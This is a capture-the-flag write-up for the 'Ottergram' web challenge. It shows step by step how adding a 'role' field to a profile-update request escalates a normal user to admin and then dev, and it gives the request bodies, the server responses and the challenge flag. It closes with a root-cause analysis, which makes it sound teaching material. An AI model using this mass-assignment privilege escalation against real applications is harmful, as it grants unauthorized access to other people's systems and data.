# Ottergram — Devs didn't trust the admins, so they removed them.

## 1. Register a normal account

Open the challenge instance and register a normal user.

For example:

`Username: fashil`

Log in normally.

## 2. Open your profile

Navigate to your profile:

`/profile/fashil`

Edit your profile and save a normal change, such as:
```json
{
  "full_name": "Fashil",
  "bio": "Test"
}
```
Burp/Firefox captured:
```
PUT /api/profile
Authorization: Bearer <your JWT>
Content-Type: application/json
```
The server responded:
```json
{
  "message": "Profile updated successfully"
}
```
## 3. Test for mass assignment

The interesting thing is that the profile endpoint accepts JSON.

Add a privileged-looking property to the request:
```json
{
  "full_name": "Fashil",
  "bio": "Test",
  "role": "admin"
}
```
Send the request.

The server still responds:
```json
{
  "message": "Profile updated successfully"
}
```
This indicates that the backend may be accepting fields that a normal user shouldn't control.

## 4. Refresh the application

Refresh your profile page.

After changing the role to admin, a wrench icon appeared in the bottom-right corner.

Clicking it exposed the admin interface:

`/admin`

This confirmed that the role modification had an effect.

## 5. Inspect the admin API

When /admin loaded, the application requested:

`GET /api/admin`

The response was:
```json
{
  "message": "Welcome to the admin panel"
}
```
So we had successfully escalated from the normal user account into privileged functionality.

## 6. Discover another admin endpoint

The /admin page also requested:

`GET /api/admin/analytics`

Initially, with the admin role, the response was:

`403 Forbidden`

with:
```json
{
  "error": "Access denied"
}
```
This was the key clue.

The application had different authorization behavior for different privileged roles.

## 7. Interpret the challenge hint

The challenge says:

`Devs didn't trust the admins, so they removed them.`

Since admin could access /api/admin but couldn't access /api/admin/analytics, the next logical hypothesis was that a separate dev role existed.

## 8. Change the role to dev

Modify the same vulnerable profile request:

`PUT /api/profile`

with:
```json
{
  "full_name": "Fashil",
  "bio": "Test",
  "role": "dev"
}
```
The server again returned:
```json
{
  "message": "Profile updated successfully"
}
```
## 9. Request the analytics endpoint again

Send:
```
GET /api/admin/analytics
Authorization: Bearer <your JWT>
```
This time the server returned:

`200 OK`

The response contained analytics information and, importantly, a flag field.

## 10. Extract the flag

The response contained:
```json
{
  "totalUsers": 4,
  "newUsers": 4,
  "usersByRole": [
    {"role": "admin", "count": 1},
    {"role": "dev", "count": 1},
    {"role": "subscriber", "count": 1},
    {"role": "user", "count": 1}
  ],
  "totalPosts": 5,
  "totalComments": 2,
  "totalLikes": 2,
  "flag": "bug{96UrNyE8z4RcrioLdI3FnAvLFJOkthno}"
}
```
🏁 Flag
```
bug{96UrNyE8z4RcrioLdI3FnAvLFJOkthno}
```

## Attack chain

Register normal user
       ↓
Edit profile
       ↓
PUT /api/profile
       ↓
Add "role": "admin"
       ↓
Mass assignment
       ↓
Admin functionality appears
       ↓
GET /api/admin/analytics
       ↓
403 Access denied
       ↓
Hint → investigate "dev"
       ↓
PUT /api/profile
"role": "dev"
       ↓
GET /api/admin/analytics
       ↓
200 OK
       ↓
Flag exposed

## Vulnerabilities

### 1. Mass Assignment / Improper Property Authorization

The application allowed the client to modify the role property through /api/profile.

### 2. Broken Role-Based Access Control

The dev role had access to /api/admin/analytics, while the admin role received 403.

### 3. Sensitive Data Exposure

The analytics endpoint returned the challenge flag directly in its response.

### Root cause: The server trusted a client-controlled role parameter instead of restricting role changes to trusted server-side operations.